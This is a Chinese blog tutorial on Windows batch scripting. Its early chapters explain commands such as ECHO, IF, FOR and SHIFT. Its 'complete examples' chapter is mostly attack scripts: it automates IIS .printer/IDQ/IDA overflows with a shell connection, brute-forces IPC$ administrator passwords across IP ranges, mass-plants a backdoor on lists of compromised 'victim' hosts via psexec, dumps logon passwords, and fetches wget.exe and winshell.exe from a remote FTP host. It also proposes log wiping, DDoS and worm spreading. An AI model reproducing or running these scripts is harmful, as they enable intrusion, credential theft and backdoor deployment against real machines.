bat批处理脚本命令大全

Regent Wan 2020-07-03 23:26:00  100  收藏
分类专栏： 常用技巧 工具 资源 文章标签： shell编程语言linux
版权
bat关键字：echo、@、call、rem、pause

echo：显示此命令后的语句
echo off：表示在此语句后所有命令都不显示命令行本身
@与echo off想像，但是加载其他命令行的最前面
call：调用另一条批处理文件（如果直接调用别的批处理文件 ，执行完那条档后将无法执行当前档后续命令）
pause：运行此句会暂停，等待用户按任意键继续
rem：表示此命令后的字符为解释行，不执行

第一章 批处理的专用命令
批处理文件是将一系列命令按一定的顺序集合为一个可执行的文本文件，其扩展名为BAT，这些命令统称批处理命令。

一．REM
注释命令一般是用来给程序加上注解的，该命令后的内容在程序执行的时候将不会被显示和执行。

二．ECHO
ECHO 是一个回显命令，主要参数有OFF和 ON,一般用ECHO message来显示一个特定的消息。

三．GOTO
在批处理中允许以“：XXX”来构建一个标号，然后用“GOTO ：标号”直接来执行标号后的命令。
eg:
:LABEL
REM 上面就是名为LABEL的标号。
DIR C:
DIR D:
GOTO LABEL
REM 以上程序跳转标号LABEL处继续执行。

四．CALL
在批处理执行过程中调用另一个批处理，当另一个批处理执行完后再继续执行原来的批处理。
语法：
call [[Drive:][Path] FileName [BatchParameters]] [:label [arguments]]
参数：
[Drive:}[Path] FileName
指定要调用的批处理程序的位置和名称。filename 参数必须具有 .bat 或 .cmd 扩展名。
eg:
批处理2.BAT内容如下：
ECHO 这就是2的内容
批处理1.BAT内容如下：
ECHO 这是1的内容
CALL 2.BAT
ECHO 1和2的内容全部显示完成
执行结果如下：
C:>1.BAT
这是1的内容
这就是2的内容
1和2的内容全部显示完成

五．PAUSE
PAUSE 停止系统命令的执行并显示下面的内容。

六．START
调用外部程序，所有的DOS命令和命令行程序都可以由start命令来调用。
入侵常用参数：
MIN 开始时窗口最小化
SEPARATE 在分开的空间内开始 16 位 Windows 程序
HIGH 在 HIGH 优先级类别开始应用程序
REALTIME 在 REALTIME 优先级类别开始应用程序
WAIT 启动应用程序并等候它结束
parameters 这些为传送到命令/程序的参数
执行的应用程序是 32-位 GUI 应用程序时，CMD.EXE 不等应用程序终止就返回命令提示。如果在命令脚本内执行，该新行为则不会发生。

七．CHOICE
choice 使用此命令可以让用户输入一个字符，从而运行不同的命令。使用时应该加/c:参数，c:后应写提示可输入的字符，之间无空格。它的返回码为1234……
eg:
choice /c:dme defrag,mem,end
将显示
defrag,mem,end[D,M,E]?
Sample：
Sample.bat的内容如下:
@echo off
choice /c:dme defrag,mem,end
if errorlevel 3 goto defrag （应先判断数值最高的错误码）
if errorlevel 2 goto mem
if errotlevel 1 goto end

:defrag
c:\dos\defrag
goto end
:mem
mem
goto end
:end
echo good bye

八．IF
if 表示将判断是否符合规定的条件，从而决定执行不同的命令。 有三种格式:
1、if “参数” == “字符串” 待执行的命令
参数如果等于指定的字符串，则条件成立，运行命令，否则运行下一句。(注意是两个等号）
如if "%1"“a” format a:
if {%1}{} goto noparms
if {%2}=={} goto noparms

2、if exist 文件名 待执行的命令
如果有指定的檔，则条件成立，运行命令，否则运行下一句。
如if exist config.sys edit config.sys

3、if errorlevel / if not errorlevel 数字 待执行的命令
如果返回码等于指定的数字，则条件成立，运行命令，否则运行下一句。
如if errorlevel 2 goto x2
DOS程序运行时都会返回一个数字给DOS，称为错误码errorlevel或称返回码，常见的返回码为0、1。

条件判断语句，语法格式如下：
IF [NOT] ERRORLEVEL number command
IF [NOT] string1string2 command
IF [NOT] EXIST filename command
说明：
[NOT] 将返回的结果取反值即“如果没有”的意思。
ERRORLEVEL 是命令执行完成后返回的退出值
Number 退出值的数字取值范围0~255。判断时值的排列顺序应该由大到小。返回的值大于或等于指定的值时条件成立。
string1string2 string1和string2都为字符的数据，英文字符的大小写将看做不同，这个条件中的等于号必须是2个（绝对相等），条件相等后即执行后面的 command
EXIST filename 为文件或目录存在的意思。
IF ERRORLEVEL这条语句必须放在某一个命令后面。执行命令后由IF ERRORLEVEL来判断命令的返回值。
eg:
1、 IF [NOT] ERRORLEVEL number command
检测命令执行完后的返回值做出判断。
echo off
dir z:
rem 如果退出代码为1（不成功）就跳至标题1处执行
IF ERRORLEVEL 1 goto 1
rem 如果退出代码为0（成功）就跳至标题0处执行
IF ERRORLEVEL 0 goto 0
:0
echo 命令执行成功！
Rem 程序执行完毕跳至标题exit处退出
goto exit
:1
echo 命令执行失败！
Rem 程序执行完毕跳至标题exit处退出
goto exit
:exit
Rem 这里是程序的出口
2、 IF string1string2 command
检测当前变量的值做出判断
ECHO OFF
IF %12 goto no
Echo 变数相等！
Goto exit
:no
echo 变数不相等
goto exit
:exit
大家可以这样看效果 C:>test.bat 数字

3、 IF [NOT] EXIST filename command
发现特定的文件做出判断
echo off
IF not EXIST autoexec.bat goto 1
echo 文件存在成功！
goto exit
:1
echo 檔不存在失败！
goto exit
:exit

九．FOR
是一个循环执行命令的命令，同时FOR的循环里面还可以套用FOR在进行循环。
在批处理中FOR的命令如下：
FOR [%%c] IN (set) DO [command] [arguments]
在命令行中命令如下：
FOR [%c] IN (set) DO [command] [arguments]
常用参数：
/L 该集表示以增量形式从开始到结束的一个数字序列。因此，(1,1,5) 将产生序列 1 2 3 4 5，(5,-1,1) 将产生序列 (5 4 3 2 1)。
/D 如果集中包含通配符，则指定与目录名匹配，而不与文件名匹配。

/F 从指定的文件中读取数据作为变量
eol=c - 指一个行注释字符的结尾(就一个)
skip=n - 指在檔开始时忽略的行数。
delims=xxx - 指分隔符集。这个替换了空格和跳格键的默认分隔符集。
tokens=x,y,m-n - 指每行的哪一个符号被传递到每个迭代的 for 本身。这会导致额外变量名称的分配。m-n格式为一个范围。通过 nth 符号指定 mth。如果符号字符串中的最后一个字符星号，那么额外的变量将在最后一个符号解析之后分配并接受行的保留文本。
usebackq - 指定新语法已在下类情况中使用:在作为命令执行一个后引号的字符串并且一个单引号字符为文字字符串命令并允许在 filenameset中使用双引号扩起文件名称。
下面来看一个例子：
FOR /F "eol=; tokens=2,3* delims=, " %i in (myfile.txt) do @echo %i %j %k
会分析 myfile.txt 中的每一行，忽略以分号打头的那些行，将每行中的第二个和第三个符号传递给 for 程序体；用逗号和/或空格定界符号。请注意，这个 for 程序体的语句引用 %i 来取得第二个符号，引用 %j 来取得第三个符号，引用 %k来取得第三个符号后的所有剩余符号。对于带有空格的文件名，您需要用双引号将文件名括起来。为了用这种方式来使用双引号，您还需要使用 usebackq 选项，否则，双引号会被理解成是用作定义某个要分析的字符串的。
%i 专门在 for 语句中得到说明，%j 和 %k 是通过tokens= 选项专门得到说明的。您可以通过 tokens= 一行指定最多 26 个符号，只要不试图说明一个高于字母 ‘z’ 或’Z’ 的变数。请记住，FOR 变量名分大小写，是通用的；而且，同时不能有 52 个以上都在使用中。
您还可以在相邻字符串上使用 FOR /F 分析逻辑；方法是，用单引号将括号之间的 filenameset 括起来。这样，该字符串会被当作一个檔中的一个单一输入行。最后，您可以用 FOR /F 命令来分析命令的输出。方法是，将括号之间的 filenameset 变成一个反括字符串。该字符串会被当作命令行，传递到一个子 CMD.EXE，其输出会被抓进内存，并被当作文件分析。
eg:
FOR /F “usebackq delims==” %i IN (set) DO @echo %i
会枚举当前环境中的环境变量名称。

删除档1.TXT 2.TXT 3.TXT 4.TXT 5.TXT
例：
ECHO OFF
FOR /L %%F IN (1,1,5) DO DEL %%F.TXT
或
FOR %%F IN (1,2,3,4,5) DO DEL %%F.TXT

十．SETLOCAL
开始批处理文件中环境改动的本地化操作。在执行 SETLOCAL 之后所做的环境改动只限于批处理文件。要还原原先的设置，必须执行 ENDLOCAL。 达到批处理文件结尾时，对于该批处理文件的每个尚未执行的 SETLOCAL 命令，都会有一个隐含的 ENDLOCAL 被执行。
eg:
@ECHO OFF
SET PATH /*察看环境变量PATH
PAUSE
SETLOCAL
SET PATH=E:\TOOLS /*重新设置环境变量PATH
SET PATH
PAUSE
ENDLOCAL
SET PATH
从上例我们可以看到环境变量PATH第1次被显示得时候是系统默认路径。被设置成了E:\TOOLS后显示为E:\TOOLS但当ENDLOCAL后我们可以看到他又被还原成了系统的默认路径。但这个设置只在该批处理运行的时候有作用。当批处理运行完成后环境变量PATH将会还原。

十一．SHIFT
让在命令上的的命令使用超过10个（%0~%9）以上的可替代参数。

第二章 特殊的符号与批处理
一．@
关闭当前行的回显。我们从上面知道用命令echo off可以关掉整个批处理的命令回显但却不能不显示echo off这个命令。现在我们在这个命令前加上@这样echo off这一命令就被@关闭了回显从而达到所有命令均不回显得要求

二．>
传递并覆盖。他所起的作用是将运行后的回显结果传递到后面的范围（后面可是文件也可是默认的系统控制台）
eg:
文件1.txt的檔内容为：
1+1
使用命令c:>dir *.txt >1.txt
这时候1.txt的内容如下
驱动器 C 中的卷没有标签。
卷的序列号是 301A-1508
C:\ 的目录
2003-03-11 14:04 1,005 FRUNLOG.TXT
2003-04-04 16:38 18,598,494 log.txt
2003-04-04 17:02 5 1.txt
2003-03-12 11:43 0 aierrorlog.txt
2003-03-30 00:35 30,571 202.108.txt
5 个文件 18,630,070 字节
0 个目录 1,191,542,784 可用字节

三．>>
与符号>相似，但他们的区别在于>>是传递并在檔末尾追加>>也可将回显传递给控制台（用法同上）,加在了原始的檔内容后面。

四．|
是一个管道传输命令意思是将上一命令执行的结果传递给下一命令去处理。

五．^
对特殊符号 > 、<、 &的前导字符。在命令中他将以上的3个符号的特殊功能去掉仅仅只吧他们当成符号而不使用他们的特殊意义。

六．&
允许在一行中使用2个以上不同的命令，当第一个命令执行失败将不影响第2个命令的执行。
eg:
c:> dir z:\ &dir y:\ &dir c:\

七．&&
是允许在一行中使用2个以上不同的命令，当第一个命令执行失败后后续的命令将不会再被执行。
eg:
c:> dir z:\ &&dir y:\ &&dir c:\

八．“”
允许在字符串中包含空格.
eg:
c:>cd “Program Files”
c:>cd progra~1
c:>cd pro*
以上方法都可以进入Program Files目录

九．,
相当于空格。在某些特殊的情况下可以用,来代替空格使用。

十．;
当命令相同的时候可以将不同的目标用;隔离开来但执行效果不变。如执行过程中发生错误则只返回错误报告但程序还是会继续执行。
eg:
DIR C:;D:;E:\F:\

第三章 批处理与变量
批处理每次能处理的变量从%0~%9共10个。其中%0默认给批处理的文件名使用。除非在使用SHIFT命令后%0才能被%1所替代。引用shift命令的例子如果把%1前面多加上一个%0。
系统区分变量的规则为字符串中间的空格，即只要发现空格就把空格前面的字符当作一个变量而空格后面的字符则作为另一个变量。
在系统中还有一种变量称之为环境变量（使用SET命令可以查看当前系统的环境变量）如当前系统目录是%windir%或%SystemRoot%等。当同时使用的参数超过10个的时候，我们可以把某些在后面的程序中还要调用的变量保存为环境变量。具体用法如 SET A=%1 这样我们就命名了一个新的环境变量A 在调用变量A的时候要%A%这样调用，环境变量不受SHIFT命令影响。如果要改变一个环境变量需要重新对其设置才能改变。当然也可以进行变量与变量之间的传递来达到目的。
eg:
ECHO OFF
SET PASS=%1
SHIFT
SET PASS1=%1
SHIFT
ECHO %PASS% %PASS1% %1 %2 %3 %4 %5 %6 %7 %8 %9
SHIFT
ECHO %PASS% %PASS1% %9
SET PASS=%PASS1% 变数的传递
SET PASS1=%9
SHIFT
ECHO %PASS% %PASS1% %9
使用命令：C:>TEST A B 3 4 5 6 7 8 9 10 K L
A B 3 4 5 6 7 8 9 10 K 注意：这一行显示了11个变量
A B L 在使用了3次SHIFT之后%9变成了L
B L 变量的传递后的结果

第四章 完整案例
例一
这个例子是利用iis5hack.exe对有.printer漏洞的主机进行溢出的批处理。用到的程序有iis5hack.exe和系统自带的telnet.exe。iis5hack的命令格式为：
iis5hack <目标ip> <目标端口> <目标版本> <溢出连接端口>目标版本为0-9这10个数字分别对应不同语言版本和sp的系统版本，我们编制的批处理使用的命令格式为 开始版本号可有可无。程序如下。
@echo off /*关闭命令回显
if “%1%”"" goto help /*判断%1是否为空，%1为目标ip
if “%2%”“1” goto 1 /判断%2是否为1，为1则跳转标志1
if “%2%”==“2” goto 2 /%2为开始版本号，如果没有设置则
if “%2%”“3” goto 3 /*如果存在则从匹配的地方开始执行
if “%2%”“4” goto 4
if “%2%”“5” goto 5
if “%2%”“6” goto 6
if “%2%”“7” goto 7
if “%2%”“8” goto 8
if not EXIST iis5hack.exe goto file /*没有发现iis5hack.exe就执行标志file段内容
ping %1 -n 1 | find “Received = 1” /*ping目标1次，从结果中发现Received = 1
if errorlevel 1 goto error /*如果返回代码为1则执行error段(代码1为没有发现 0为发现并成功执行)
iis5hack %1 80 9 88 | find “good” /*开始溢出目标端口80 系统代码9 溢出后连接埠88 在执行结果中发现字符串”good”(溢出成功后才会有字符串good)
if not errorlevel 1 goto telnet /*如果没有错误代码1（溢出成功）就执行telnet段的内容。
echo 操作系统类型 9 失败! /否则显示这一句
:8 /*以下代码内容参照上面
iis5hack %1 80 8 88 | find “good”
if not errorlevel 1 goto telnet
echo 操作系统类型 8 失败!
:7
iis5hack %1 80 7 88 | find “good”
if not errorlevel 1 goto telnet
echo 操作系统类型 7 失败!
:6
iis5hack %1 80 6 88 | find “good”
if not errorlevel 1 goto telnet
echo 操作系统类型 6 失败!
:5
iis5hack %1 80 5 88 | find “good”
if not errorlevel 1 goto telnet
echo 操作系统类型 5 失败!
:4
iis5hack %1 80 4 88 | find “good”
if not errorlevel 1 goto telnet
echo 操作系统类型 4 失败!
:3
iis5hack %1 80 3 88 | find “good”
if not errorlevel 1 goto telnet
echo 操作系统类型 3 失败!
:2
iis5hack %1 80 2 88 | find “good”
if not errorlevel 1 goto telnet
echo 操作系统类型 2 失败!
:1
iis5hack %1 80 1 88 | find “good”
if not errorlevel 1 goto telnet
echo 操作系统类型 1 失败!
:0
iis5hack %1 80 0 88 | find “good”
if not errorlevel 1 goto telnet
echo 操作系统类型 0 失败!
goto error
:telnet
telnet %1 88 /*开始连接目标ip的88端口
goto exit /*连接中断后跳转exit段
:error /*error段显示错误后的帮助信息
echo 可能网络不能连接或者对方以修补该漏洞!请按照下面的格式手工尝试一次!
echo iis5hack [目标IP] [WEB端口] [系统类型] [开放埠]
ECHO 中文: 0
ECHO 中文+sp1: 1
ECHO 英文: 2
ECHO 英文+sp1: 3
ECHO 日语: 4
ECHO 日语+sp1: 5
ECHO 韩文: 6
ECHO 韩文+sp1: 7
ECHO 墨西哥语: 8
ECHO 墨西哥语+sp1: 9
goto exit /*跳转exit段
:file /*file段显示文件没有发现的信息
echo 文件iis5hack.exe没有发现!程序终止运行!
goto exit /*跳转exit段
:help /*help段显示本批处理的使用格式帮助
echo 本程序用法如下:
echo iis [目标ip]
echo iis [目标ip] [开始的号码9-0]
:exit /*exit段为程序出口
这个批处理基本没有什么循环只是一路走下来。所以代码比较长难度不大！

例二
这个例子是用iisidq.exe对有idq漏洞的机器进行溢出的批处理。使用的程序有iisidq.exe和系统自带的程序telnet.exe。iisidq.exe的用法如下：
运行参数: 操作系统类型 目的地址 web埠 1 溢出监听埠 <输入命令1>
其中,如果输入命令参数没有输入,那么,默认为:“cmd.exe”。
其中操作系统类型类型的代码范围是0-14。我们编制的批处理使用的命令格式为 程序如下：
@echo off /*同例一
if not EXIST iisidq.exe goto file /*同例一
if %1 == “” goto error /*同例一
ping %1 -n 1 | find “Received = 1” /*同例一
if errorlevel 1 goto error1 /*同例一
set b=%1 /*创建一个环境变量b,将变量%1的内容传递给环境变量b。变量b的内容以后将是目标ip
set a=0 /*创建一个环境变量a并指定环境变量a为0。由于使用整个批处理的循环所以用a来做计数器。
:no /*no段开始
if %a%==0 set d=0 /*如果环境变量a=0则创建环境变量d设定环境变量d=0。
if %a%==1 set d=1 /*环境变量d其实是操作系统类型代码，用计数器来控制其
if %a%==2 set d=2 /*变动。
if %a%==3 set d=3
if %a%==4 set d=4
if %a%==5 set d=5
if %a%==6 set d=6
if %a%==7 set d=7
if %a%==9 set d=9
if %a%==10 set d=13
if %a%==11 set d=14
goto 0 /*变量传递完成后转到标志0处运行
:1
echo 正在执行第%d%项!与目标%b%不能连接!正在尝试连接请等候…
:0 /*标志0开始
IISIDQ %d% %b% 80 1 99 |find “good” /*按格式发送溢出命令并在结果中发现字符串good（发送代码成功才会有字符串good）
if errorlevel 1 goto 1 /*如果没有good字符串则没有发送成跳
/*转标志1处继续尝试发送
ping 127.0.0.1 -n 8 >nul /*ping自己8次相当于延时8秒不显示执
/*行结果
echo 正在执行第%d%项! /*报告正在溢出的操作系统类型
telnet %b% 99 /*连接溢出埠
echo. /*显示一个空行
if %d%==14 goto error1 /*如果操作系统类型为14则跳转error1处（循环出口）
if %d%==13 set a=11 /*开始用计数器对操作系统代码重新附值
if %d%==9 set a=10
if %d%==7 set a=9
if %d%==6 set a=7
if %d%==5 set a=6
if %d%==4 set a=5
if %d%==3 set a=4
if %d%==2 set a=3
if %d%==1 set a=2
if %d%==0 set a=1
goto no /*附值完成跳转no段执行
:file /*以下都是出错后的帮助提示
echo IIsidq.exe没有发现!将该文件和本文件放在同一目录!
goto exit
:error
echo 错误!目标ip不可识别!请使用下面的格式连接!
echo idq [目标IP]
goto exit
:error1
echo 连接没有成功!可能目标机器已经修补了该漏洞或者网络故障所至!
echo 请按照下面的格式手工尝试!
echo iisidq [目标类型] [目标IP] [目标端口] [连接方式] [溢出埠]
echo telnet [目标ip] [溢出埠]
:exit /*整个程序的出口
这个批处理采用的整体循环掌握好计数器部分就掌握了这个批处理。

例三
for /l %%a in (0,1,255) do for /l %%b in (0,1,255) do for /l %%c in (1,1,254) do for /f “tokens=1,2*” %%e in (userpass.txt) do net use \%1.%%a.%%b.%%c\ipc$ %%e /u:%%f
上面的命令为1条命令。大家可以看出该命令使用了4个FOR来套用的。用法为：C:>TEST.BAT 218 当输入218回车后该命令会由第1个for取初始值0为%%a然后继续取第2个for的初始值0为%%b继续取第3个for的初始值1为%%c最后一个for是将userpass.txt中的第一段字符作为密码%%e第二段字符作为用户名%%f最后执行命令 (这里我把上面的值都带进去，设密码为123 用户名为 abc)
net usr \218.0.0.1\ipc$ 123 /u:abc

sample2：

利用For命令来实现对一台目标Win2k主机的暴力密码破解。
我们用net use \ip\ipc$ “password” /u:"administrator"来尝试这和目标主机进行连接，当成功时记下密码。
最主要的命令是一条：for /f i% in (dict.txt) do net use \ip\ipc$ “i%” /u:“administrator”
用i%来表示admin的密码，在dict.txt中这个取i%的值用net use 命令来连接。然后将程序运行结果传递给find命令－－
for /f i%% in (dict.txt) do net use \ip\ipc$ “i%%” /u:“administrator”|find “:命令成功完成”>>D:\ok.txt ，这样就ko了。

sample3：

你有没有过手里有大量肉鸡等着你去种后门＋木马呢？，当数量特别多的时候，原本很开心的一件事都会变得很郁闷：）。文章开头就谈到使用批处理文件，可以简化日常或重复性任务。那么如何实现呢？呵呵，看下去你就会明白了。

主要命令也只有一条：（在批处理文件中使用 FOR 命令时，指定变量使用 %%variable）
@for /f "tokens=1,2,3 delims= " %%i in (victim.txt) do start call door.bat %%i %%j %%k
tokens的用法请参见上面的sample1，在这里它表示按顺序将victim.txt中的内容传递给door.bat中的参数%i %j %k。
而cultivate.bat无非就是用net use命令来建立IPC$连接，并copy木马＋后门到victim，然后用返回码（If errorlever =）来筛选成功种植后门的主机，并echo出来，或者echo到指定的檔。
delims= 表示vivtim.txt中的内容是一空格来分隔的。我想看到这里你也一定明白这victim.txt里的内容是什么样的了。应该根据%%i %%j %%k表示的对象来排列，一般就是 ip password username。
代码雏形：-+

--------------- cut here then save as a batchfile(I call it main.bat ) --------------------
@echo off
@if “%1”=="" goto usage
@for /f "tokens=1,2,3 delims= " %%i in (victim.txt) do start call IPChack.bat %%i %%j %%k
@goto end
:usage
@echo run this batch in dos modle.or just double-click it.
:end
--------------- cut here then save as a batchfile(I call it main.bat ) --------------------

------------------- cut here then save as a batchfile(I call it door.bat) -----------------
@net use \%1\ipc$ %3 /u:"%2"
@if errorlevel 1 goto failed
@echo Trying to establish the IPC$ connection …………OK
@copy windrv32.exe\%1\admin$\system32 && if not errorlevel 1 echo IP %1 USER %2 PWD %3 >>ko.txt
@p***ec \%1 c:\winnt\system32\windrv32.exe
@p***ec \%1 net start windrv32 && if not errorlevel 1 echo %1 Backdoored >>ko.txt
:failed
@echo Sorry can not connected to the victim.
----------------- cut here then save as a batchfile(I call it door.bat) -------------------
这只是一个自动种植后门批处理的雏形，两个批处理和后门程序（Windrv32.exe）,PSexec.exe需放在统一目录下.批处理内容
尚可扩展,例如:加入清除日志+DDOS的功能,加入定时添加用户的功能,更深入一点可以使之具备自动传播功能(蠕虫).此处不多做叙述,有兴趣的朋友可自行研究.

简单批处理文件概念
######################################################################
echo This is test > a.txt
type a.txt
echo This is test 11111 >> a.txt
type a.txt
echo This is test 22222 > a.txt
type a.txt
第二个echo是追加
第三个echo将清空a.txt 重新创建 a.txt

netstat -n | find “3389”
这个将要列出所有连接3389的用户的ip.

test.bat___________________________________
@echo please care
echo plese care 1111
echo plese care 2222
echo plese care 3333
@echo please care
@echo plese care 1111
@echo plese care 2222
@echo plese care 3333
rem 不显示注释语句,本行显示
@rem 不显示注释语句,本行不显示
@if exist %windir%system32find.exe (echo Find find.exe !!!) else (echo ERROR: Not find find.exe)
@if exist %windir%system32fina.exe (echo Find fina.exe !!!) else (echo ERROR: Not find fina.exe)

下面我们以具体的一个idahack程序就是ida远程溢出为例子.应该是很简单的.

ida.bat______________________________
@rem ver 1.0
@if NOT exist %windir%system32idahack.exe echo “ERROR: dont find idahack.exe”
@if NOT exist %windir%system32nc.exe echo “ERROR: dont find nc.exe”

@if “%1” =="" goto USAGE
@if NOT “%2” =="" goto SP2

:start
@echo Now start …
@ping %1
@echo chinese win2k:1 sp1:2 sp2:3
idahack.exe %1 80 1 99 >%temp%_tmp
@echo “prog exit code [%errorlevel%] idahack.exe”
@type %temp%_tmp
@find “good luck 😃” %temp%_tmp
@echo “prog exit code [%errorlevel%] find [goog luck]”
@if NOT errorlevel 1 nc.exe %1 99
@goto END

:SP2
@idahack.exe %1 80 %2 99 %temp%_tmp
@type %temp%_tmp
@find “good luck 😃” %temp%_tmp
@if NOT errorlevel 1 nc.exe %1 99
@goto END

:USAGE
@echo Example: ida.bat IP
@echo Example: ida.bat IP (2,3)

:END
ida.bat__END____________

下面我们再来第二个文件.就是得到administrator的口令.
大多数人说得不到.其实是自己的没有输入正确的信息.

fpass.bat_________________
@rem ver 1.0
@if NOT exist %windir%system32findpass.exe echo “ERROR: dont find findpass.exe”
@if NOT exist %windir%system32pulist.exe echo “ERROR: dont find pulist.exe”

@echo start…
@echo ____________________________________
@if “%1”=="" goto USAGE
@findpass.exe %1 %2 %3 >> %temp%_findpass.txt
@echo “prog exit code [%errorlevel%] findpass.exe”
@type %temp%_findpass.txt
@echo ________________________________Here__pass★★★★★★★★
@ipconfig /all >>%temp%_findpass.txt
@goto END

:USAGE
@pulist.exe >%temp%_pass.txt
@findstr.exe /i “WINLOGON explorer internat” %temp%_pass.txt
@echo “Example: fpass.bat %1 %2 %3 %4 !!!”
@echo “Usage: findpass.exe DomainName UserName PID-of-WinLogon”

:END
@echo " fpass.bat %COMPUTERNAME% %USERNAME% administrator "
@echo " fpass.bat end [%errorlevel%] !"
fpass.bat___END_______________________

还有一个就是已经通过telnet登陆了一个远程主机.怎样上传文件(win)
依次在窗口输入下面的东西. 当然了也可以全部拷贝.Ctrl+V过去. 然后就等待吧!!

echo open 210.64.x.4 3396>w
echo read>>w
echo read>>w
echo cd winnt>>w
echo binary>>w
echo pwd >>w
echo get wget.exe >>w
echo get winshell.exe >>w
echo get any.exe >>w
echo quit >>w
ftp -s:w
————————————————
版权声明：本文为CSDN博主「Regent Wan」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/Zeno_wrj/article/details/107117374